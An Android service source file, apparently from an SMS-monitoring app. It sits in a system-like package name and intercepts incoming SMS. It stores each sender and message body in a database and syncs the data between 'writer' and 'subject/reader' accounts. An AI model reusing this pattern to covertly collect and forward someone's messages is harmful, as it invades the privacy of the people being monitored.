package android.service.app;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.preference.PreferenceManager;
import android.service.app.db.data.GenericAccount;
import android.service.app.db.data.GenericDevice;
import android.service.app.db.data.impl.Device;
import android.service.app.db.data.impl.Message;
import android.service.app.db.sqllite.SqlLiteDatabase;
import android.service.app.receiver.ReceiverManager;
import android.service.app.task.impl.ExportDataTask;
import android.service.app.task.impl.ImportDataTask;
import android.service.app.task.impl.SyncOutput;
import android.service.app.sms.SmsObserver;
import android.service.app.ui.SettingsActivity;
import android.service.app.utils.AndroidUtils;
import android.service.app.utils.Log;
import android.support.annotation.Nullable;

public class Service extends android.app.Service
{
    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    protected Handler handler = new Handler();
    public AndroidApplication app;
    private RemoteService.Stub remoteServiceStub;
    private boolean serviceStatus;
    private GenericDevice device = new Device();

    @Override
    public void onCreate()
    {
        app = (AndroidApplication) getApplication();
        app.service = this;

        SmsObserver smsObserver = new SmsObserver(this, handler);
        IntentFilter smsFilter = new IntentFilter(SMS_RECEIVED);

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.registerReceiver(smsObserver.inSms, smsFilter, getApplicationContext());
        }

        //reset();
    }

    private void reset()
    {
        SqlLiteDatabase.clear(getApplicationContext());
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(SettingsActivity.EMAIL_FIELD_NAME, "");
        editor.commit();
    }

    private void fillDeviceIfNeeded()
    {
        SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(getApplicationContext())
        {
            @Override
            public Object execute()
            {
                return devices().getFirst();
            }
        };

        GenericDevice genericDevice = (GenericDevice) databaseWork.run();
        if (genericDevice.getId() == SqlLiteDatabase.DatabaseWork.EMPTY_DATA)
        {
            if (Log.isInfoEnabled()) Log.info("absent device, please wait...");
            return;
        }

        this.device = genericDevice;
        if (Log.isInfoEnabled()) Log.info("device: " + device);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        if (Log.isDebugEnabled()) Log.debug("call onStartCommand");
        fillDeviceIfNeeded();

        remoteServiceStub = new RemoteService.Stub()
        {
            public void sendString(String string) throws RemoteException
            {

            }
        };

        app.service = this;

        runSync(getApplicationContext());

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        SmsObserver smsObserver = new SmsObserver(this, handler);
        if (receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.unregisterReceiver(smsObserver.inSms, getApplicationContext());
        }
    }

    private static void runSync(final Context context)
    {
        SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(context){
            @Override
            public Object execute()
            {
                GenericAccount account = accounts().getFirst();
                Log.info("account: " + account);

                if (account.isEmpty())
                {
                    if (Log.isInfoEnabled()) Log.info("absent account, skipping import/export task...");
                    return null;
                }

                if (account.getDescription().contains(AndroidUtils.SUBJECT))
                {
                    // sync for subobject functionality - READER
                    new ImportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
                }
                else
                {
                    // sync for object functionality - WRITER
                    new ExportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
                }

                return null;
            }
        };

        databaseWork.run();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return remoteServiceStub;
    }

    public void runSmsEvent(final String address, final String body, final boolean incoming)
    {
        new Thread(new Runnable()
        {
            public void run()
            {
                AndroidUtils.printDataOnScreen(address + ": " + body, app.service);
                saveMessageInDatabase(address, incoming, body);
            }
        }).start();
    }

    private void saveMessageInDatabase(final String address, final boolean incoming, final String body)
    {
        if (device == null || device.getId() == SqlLiteDatabase.DatabaseWork.EMPTY_DATA){
            fillDeviceIfNeeded();
        }
        if (device == null || device.getId() == SqlLiteDatabase.DatabaseWork.EMPTY_DATA){
            if (Log.isInfoEnabled()) Log.info("absent device for saving message from address: " + address);
            return;
        }

        SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(getApplicationContext()){
            @Override
            public Object execute()
            {
                return insert(new Message(address, incoming, body, device.getId()));
            }
        };

        databaseWork.runInTransaction();
    }
}
